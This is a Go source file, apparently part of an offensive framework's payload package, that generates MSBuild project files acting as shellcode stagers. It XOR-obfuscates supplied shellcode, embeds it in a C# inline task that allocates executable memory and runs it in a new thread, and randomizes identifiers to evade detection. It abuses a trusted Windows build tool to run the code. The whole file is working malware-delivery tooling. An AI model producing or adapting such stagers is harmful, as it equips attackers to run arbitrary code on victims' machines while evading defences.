package payload

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/big"
	"strings"
)

type MSBuildConfig struct {
	ShellcodeB64 string `json:"shellcode_b64" form:"shellcode_b64"`
	Technique    string `json:"technique" form:"technique"`
	CustomArgs   string `json:"custom_args" form:"custom_args"`
	CustomBinary string `json:"custom_binary" form:"custom_binary"`
}

func GenerateMSBuildStager(cfg MSBuildConfig) (string, error) {
	scBytes, err := base64.StdEncoding.DecodeString(cfg.ShellcodeB64)
	if err != nil {
		return "", fmt.Errorf("invalid shellcode base64: %w", err)
	}

	technique := cfg.Technique
	if technique == "" {
		technique = "inline_task"
	}

	xorKey := byte(0)
	xorKeyBig, _ := rand.Int(rand.Reader, big.NewInt(256))
	xorKey = byte(xorKeyBig.Int64())

	xored := make([]byte, len(scBytes))
	for i := range scBytes {
		xored[i] = scBytes[i] ^ xorKey
	}

	hexEncoded := hex.EncodeToString(xored)

	bufVar := randomCSharpName()
	addrVar := randomCSharpName()
	threadVar := randomCSharpName()
	xorKeyVar := randomCSharpName()

	code := fmt.Sprintf(`using System;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class %s : Task, ITask
{
    public override bool Execute()
    {
        try
        {
            byte[] %s = new byte[] { %s };
            byte %s = 0x%02x;
            for (int i = 0; i < %s.Length; i++)
            {
                %s[i] ^= %s;
            }
            IntPtr %s = VirtualAlloc(IntPtr.Zero, (UIntPtr)%s.Length, 0x1000, 0x40);
            Marshal.Copy(%s, 0, %s, %s.Length);
            IntPtr %s = CreateThread(IntPtr.Zero, 0, %s, IntPtr.Zero, 0, IntPtr.Zero);
            if (%s != IntPtr.Zero)
            {
                WaitForSingleObject(%s, 0xFFFFFFFF);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
            return false;
        }
        return true;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}`,
		randomCSharpName(),
		bufVar, hexToCSByteArray(hexEncoded),
		xorKeyVar, xorKey,
		bufVar,
		bufVar, xorKeyVar,
		addrVar, bufVar,
		bufVar, addrVar, bufVar,
		threadVar, addrVar,
		threadVar,
		threadVar,
	)

	taskName := randomCSharpName()
	targetName := randomCSharpName()

	csproj := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="%s">
    <%s />
  </Target>
  <UsingTask TaskName="%s" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
%s
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>`,
		targetName, taskName,
		taskName,
		code,
	)

	return csproj, nil
}

func hexToCSByteArray(h string) string {
	var sb strings.Builder
	for i := 0; i < len(h); i += 2 {
		if i > 0 {
			sb.WriteString(", ")
		}
		sb.WriteString("0x")
		sb.WriteByte(h[i])
		sb.WriteByte(h[i+1])
	}
	return sb.String()
}

func randomCSharpName() string {
	n, _ := rand.Int(rand.Reader, big.NewInt(26))
	first := byte('A' + n.Int64())
	length := 6 + func() int64 {
		l, _ := rand.Int(rand.Reader, big.NewInt(8))
		return l.Int64()
	}()
	name := []byte{first}
	for i := 1; i < int(length); i++ {
		c, _ := rand.Int(rand.Reader, big.NewInt(26))
		name = append(name, byte('a'+c.Int64()))
	}
	return string(name)
}
